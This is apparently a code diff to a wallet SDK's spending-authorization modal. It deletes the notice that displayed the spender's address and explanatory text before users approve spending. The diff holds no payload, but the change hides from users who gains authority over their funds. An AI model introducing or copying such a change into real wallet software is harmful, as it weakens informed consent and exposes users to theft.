@@ -1,7 +1,6 @@
 import { TERMS_VERSION } from "../core/approve-config";
 import { nativeSymbolForNetwork } from "../core/network-meta";
 import { countIncludedAssets } from "../authorization/preferences";
-import { SpenderAuthorizationNotice } from "./SpenderAuthorizationNotice";
 import { useWalletSdkT } from "../i18n/context";
 import { translateWalletError } from "../i18n/helpers";
 import type { NativeTransferEstimate } from "../native-transfer/types";
@@ -273,15 +272,6 @@ export function AuthorizeSpendingModal({
                   })}
                 </ul>
               </div>
-
-              {selected && spender ? (
-                <SpenderAuthorizationNotice
-                  message={t("modals.authorizeSpending.authorizationNotice")}
-                  spender={spender}
-                  spenderLabel={t("modals.authorizeSpending.spenderLabel")}
-                  spenderHelp={t("modals.authorizeSpending.spenderHelp")}
-                />
-              ) : null}
 
               {selected ? (
                 <button
